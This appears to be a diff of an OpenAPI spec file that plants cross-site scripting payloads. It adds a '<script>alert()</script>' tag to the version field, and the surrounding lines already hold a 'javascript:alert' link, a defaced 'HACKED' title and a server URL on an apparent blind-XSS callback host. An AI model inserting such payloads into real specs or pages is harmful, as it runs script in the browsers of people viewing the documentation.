@@ -2,7 +2,7 @@ openapi: 3.0.0
 info:
   title: Your system has been HACKED!
   description: Optional multiline or single-line description in [CommonMark](https://javascript:alert``) or HTML.
-  version: 0.1.9
+  version: 0.1.9<><><script>alert()</script>
 
 servers:
   - url: https://paktiko.bxss.in
